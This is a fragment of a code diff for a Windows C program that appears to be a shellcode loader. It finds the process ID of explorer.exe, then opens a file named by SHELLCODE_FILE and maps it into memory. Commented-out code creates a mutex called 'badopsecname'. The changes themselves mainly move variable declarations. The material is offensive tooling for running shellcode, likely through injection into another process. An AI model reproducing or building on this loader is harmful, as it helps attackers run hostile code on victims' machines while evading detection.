@@ -92,9 +92,13 @@ int findProcess();
 int main(){
     int retVal = NO_ERROR;
 	int pid = 0;
-	HANDLE processLock = NULL;
-	STARTUPINFOW si = { };
-	PROCESS_INFORMATION pi = { };
+	//HANDLE processLock = NULL;
+	//STARTUPINFOW si = { };
+	//PROCESS_INFORMATION pi = { };
+
+	HANDLE shellcodeFile = NULL;
+	HANDLE shellcodeMap = NULL;
+	void* shellcodeView = NULL;
 
 	// Assumes only one user is logged in
 	retVal = GetPidByName(L"explorer.exe", &pid);
@@ -118,7 +122,7 @@ int main(){
 	CHECK_RETVAL_GLE(retVal, "CreateProcessW", retVal, 0);
 	*/
 
-		/*
+	/*
 	// Create the mutex
 	processLock = CreateMutexW(NULL, FALSE, L"badopsecname");
 	CHECK_RETVAL_GLE(retVal, "CreateMutexW", processLock, NULL);
@@ -130,7 +134,7 @@ int main(){
 
 	// Open the shellcode file
 	// TODO: Add code to attempt to get an exclusive handle to protect the file
-	HANDLE shellcodeFile = CreateFileW(
+	shellcodeFile = CreateFileW(
 		SHELLCODE_FILE,
 		GENERIC_READ,
 		FILE_SHARE_READ,
@@ -140,7 +144,8 @@ int main(){
 		NULL);
 	CHECK_RETVAL_GLE(retVal, "CreateFileW", shellcodeFile, INVALID_HANDLE_VALUE);
 
-	HANDLE shellcodeMap = CreateFileMappingW(
+
+	shellcodeMap = CreateFileMappingW(
 		shellcodeFile,
 		NULL,
 		PAGE_READONLY, // SEC_IMAGE_NO_EXECUTE | SEC_NOCACHE
@@ -150,7 +155,7 @@ int main(){
 	);
 	CHECK_RETVAL_GLE(retVal, "CreateFileMappingW", shellcodeMap, NULL);
 
-	void* shellcodeView = MapViewOfFile(
+	shellcodeView = MapViewOfFile(
 		shellcodeMap,
 		FILE_MAP_READ,
 		0,
